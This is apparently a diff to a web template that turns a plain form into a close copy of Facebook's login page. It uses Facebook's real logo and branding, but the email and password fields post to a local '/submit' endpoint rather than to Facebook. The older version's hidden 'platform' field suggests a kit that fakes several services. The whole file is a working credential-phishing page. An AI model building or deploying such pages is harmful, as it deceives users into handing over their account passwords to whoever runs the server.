@@ -1,18 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Facebook</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <h2>Facebook Login</h2>
-    <form action="/submit" method="POST">
-        <input type="hidden" name="platform" value="Facebook">
-        <label>Email or Phone</label><br>
-        <input type="text" name="username" required><br>
-        <label>Password</label><br>
-        <input type="password" name="password" required><br>
-        <button type="submit">Log In</button>
-    </form>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="flex flex-col md:flex-row items-center md:space-x-10 p-6">
+        
+        <!-- Left Section -->
+        <div class="mb-8 md:mb-0 text-center md:text-left flex flex-col items-center md:items-start">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" class="w-80 h-auto" alt="Facebook Logo">
+            <p class="text-xl mt-4 font-bold text-gray-700 max-w-sm">
+                Facebook helps you connect and share with the people in your life.
+            </p>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-sm">
+            <form action="/submit" method="POST" class="space-y-4">
+                <input 
+                    type="text" 
+                    placeholder="Email address or phone number" 
+                    name="username"
+                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                />
+                <input 
+                    type="password" 
+                    name="password"
+                    placeholder="Password" 
+                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                />
+                <button 
+                    type="submit" 
+                    class="w-full bg-blue-600 text-white py-2 rounded-md font-semibold hover:bg-blue-700 transition"
+                >
+                    Log in
+                </button>
+                <a href="#" class="text-blue-600 text-sm block text-center hover:underline">
+                    Forgotten password?
+                </a>
+                <hr class="my-6">
+                <button 
+                    type="button" 
+                    class="w-full bg-green-500 text-white py-2 rounded-md font-semibold hover:bg-green-600 transition"
+                >
+                    Create new account
+                </button>
+            </form>
+            <p class="text-sm text-center text-gray-600 mt-6">
+                <a href="#" class="font-semibold hover:underline">
+                    Create a Page
+                </a> for a celebrity, brand or business.
+            </p>
+        </div>
+    </div>
 </body>
 </html>
